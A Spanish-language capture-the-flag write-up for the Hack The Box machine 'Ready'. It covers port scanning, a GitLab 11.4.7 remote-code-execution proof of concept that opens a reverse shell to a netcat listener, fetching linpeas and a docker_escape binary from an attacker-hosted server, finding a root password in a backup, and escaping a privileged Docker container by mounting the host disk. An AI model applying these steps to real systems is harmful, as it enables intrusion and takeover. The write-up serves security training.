# Ready

Máquina Linux con dos puertos abiertos 22:ssh y 5080:gitlab, para saber la versión de GitLab Community Edition necesitamos estar autenticados, nos registramos y vamos al directorio /help para obtener la versión de gitlab, esta version es vulnerable a ejecución de código remoto. Aprovechándonos de esta vulnerabilidad podemos obtener acceso al sistema, para ejecutar comandos en el sistema, donde podemos encontrar almacenada la contraseña de root. Llegando a este punto la flag root.txt no es visible, por lo que sigue enumerando el sistema y me di cuenta, que nos encontrábamos dentro de un docker, para finalizar escapamos del docker para obtener root pero del sistema base.

![](<../../.gitbook/assets/0 (15).png>)

## Enumeración

Lo primero que hago es realizar un escaneo con nmap para saber los puertos abiertos en el rango del 1-65536.

```
# nmap -p- --open -n -T5 10.10.10.220 -oG allPorts
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-20 11:42 CST
Nmap scan report for 10.10.10.220
Host is up (0.086s latency).
Not shown: 65533 closed ports
PORT STATE SERVICE
22/tcp open ssh
5080/tcp open onscreen
Nmap done: 1 IP address (1 host up) scanned in 25.84 seconds
```

| Bandera      | Descripción                                                                  |
| ------------ | ---------------------------------------------------------------------------- |
| -p-          | Escaneo a los 65536 puertos                                                  |
| --open       | Reporta solo los puertos con estado "open".                                  |
| -T5          | Exploracion a velocidades insanas (lo hago porque es un entorno de pruebas). |
| -v           | Muestra más información sobre el sondeo que se está realizando.              |
| -oG allPorts | Exporta los resultados en un formato Grepable con el nombre de allPorts.     |

Posteriormente verificamos las versiones de los servicios y haremos uso de scripts por default.

```
# nmap -sCV -p22,5080 10.10.10.220 -oN targeted
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-20 11:44 CST
Nmap scan report for ready.htb (10.10.10.220)
Host is up (0.070s latency).
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
| 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
5080/tcp open http nginx
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile
| /dashboard /projects/new /groups/new /groups/*/edit /users /help
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://ready.htb:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.60 seconds
```

| Bandera   | Descripción                                                             |
| --------- | ----------------------------------------------------------------------- |
| -p22,5080 | Escaneo a los puertos 22 y 5080.                                        |
| -sC       | Escanea con los scripts por defecto.                                    |
| -sV       | Intenta determinar la versión del servicio que se ejecuta en el puerto. |
| -oN       | Exporta los resultados en un formato nmap.                              |

Añadimos el nombre de vhost con la dirección correspondiente a /etc/hosts.

![](<../../.gitbook/assets/1 (15).png>)

Visitamos [http://ready.htb/robotx.txt](http://ready.htb/robotx.txt), en el directorio /help podemos obtener la versión del gitlab, pero solo si estamos autenticados.

![](<../../.gitbook/assets/2 (6).png>)

Procedemos a crearnos una cuenta.

![](<../../.gitbook/assets/3 (7).png>)

Una vez registrados, podemos volver a visitar ready.htb:5080/help, para visualizar la versión del gitlab community edition.

![](<../../.gitbook/assets/4 (8).png>)

## Punto de acceso.

En la búsqueda de un exploit, podemos ver que existe un exploit de ejecución de código remota. Buscando en github encontré la siguiente POC https://github.com/ctrlsam/GitLab-11.4.7-RCE.

![](<../../.gitbook/assets/5 (5).png>)

{% embed url="https://github.com/ctrlsam/GitLab-11.4.7-RCE.git" %}

1 Clonamos el repositorio.

2\. Antes de ejecutar el exploit en otra ventana, nos ponemos en escucha por el puerto que anteriormente indicamos

`# nc -lvnp 443`

3\. Ejecutamos el exploit.

`# python3 exploit.py -u prueba -p qwerty123 -g `[`http://ready.htb`](http://ready.htb)` -l 10.10.15.101 -P 443`

Veremos que recibimos la conexión de manera exitosa.

![](<../../.gitbook/assets/6 (6).png>)



Ahora que tenemos acceso al sistema, podemos ir buscando alguna forma de escalar en privilegios. Abriré un servidor http con python para compartir un script que enumera posibles maneras de escalar privilegios.

`# git clone `[`https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git`](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git)``

`# cd privilege-escalation-awesome-scripts-suite/linPEAS/`

`# python2 -m SimpleHTTPServer`

Lo descargamos en el servidor en la carpeta /tmp y damos permisos de ejecución

`# cd /tmp`

`# wget `[`http://10.10.15.101:8000/linpeas.sh`](http://10.10.15.101:8000/linpeas.sh)``

`# chmod +x lineas.sh`

`# ./linpeas.sh`

![](<../../.gitbook/assets/7 (3).png>)

Durante la visualización de los resultados había varias opciones de archivos interesantes. Esto me llevo un rato porque mucho del contenido lo filtraba para poder obtener alguna contraseña o los visualizaba de forma manual, pero no contenían nada interesante.

![](../../.gitbook/assets/9.png)

En cuestión de las capacidades específicas de linux, cap_chown salía como un vector potencial para escalar privilegios, checando con`getcap -r / 2>/dev/null `, pero no había resultado alguno. 

En la búsqueda de archivos interesantes, en el directorio /opt existe un backup.

![](<../../.gitbook/assets/10 (12).png>)

Filtre por palabras claves de manera recursiva, observando los resultados obtenemos una contraseña.

![](<../../.gitbook/assets/11 (5).png>)

Esta contraseña es de root.

![](../../.gitbook/assets/12.png)

En la ruta raíz no se encontró el archivo root.xt, pensé que había sido ilimitado, espere a que reiniciara la máquina y aún no estaba.

![](<../../.gitbook/assets/13 (7).png>)

Cuando obtenemos una shell, nuestro punto de ataque puede estar en un directorio virtual del servidor, una máquina virtual o una máquina física, o incluso en un contenedor de Docker. Para determinar si es un contendedor de Docker hacemos lo siguiente:

`grep -i docker /proc/self/cgroup 2>/dev/null; find / -name "*dockerenv*" -exec ls -la {} \; 2>/dev/null`

![](<../../.gitbook/assets/14 (7).png>)

Vemos que en efecto, somos root, pero de un docker, por lo tanto debemos de encontrar alguna manera de escapar del docker y tener acceso al sistema que está ejecutando el docker.

Para escapar del docker podemos hacerlo de forma manual o utilizar alguna herramienta, como la siguiente, podemos descargar el binario o compilarlo en nuestro ordenador. De manera manual podemos consultar este enlace.

{% embed url="https://github.com/PercussiveElbow/docker-escape-tool" %}

{% embed url="https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#privileged-flag" %}

Un contenedor bien configurado no debería permitir comandos como fdisk -l. Como no es el caso podemos ver las unidades del sistema principal. De manera manual para obtener la flag basta con montar el filesystem en un directorio.

```
# fdisk -l
Device Start End Sectors Size Type
/dev/sda1 2048 4095 2048 1M BIOS boot
/dev/sda2 4096 37746687 37742592 18G Linux filesystem
/dev/sda3 37746688 41940991 4194304 2G Linux swap
# cd /tmp
# mkdir root
# mount /dev/sda2 /tmproot
# ls /tmp/root
```

Con esto ya podemos visualizar la flag.

![](<../../.gitbook/assets/15 (1).png>)

Ahora si queremos tener acceso al sistema por medio de SSH podemos crear unas llaves SSH, solo es de autorizarnos en el archivo authorized_keys.

Con la herramienta de arriba.

1 Primero abrimos un servidor http con python en nuestra máquina.

`# python2 -m SimpleHTTPServer`

2\. Descargamos el binario en el servidor.

`# wget `[`http://10.10.15.101:8000/docker_escape`](http://10.10.15.101:8000/docker_escape)``

3\. Le damos permisos de ejecución

`# chmod +x docker_escape`

4\. Ejecutamos

`# ./escape_docker device`
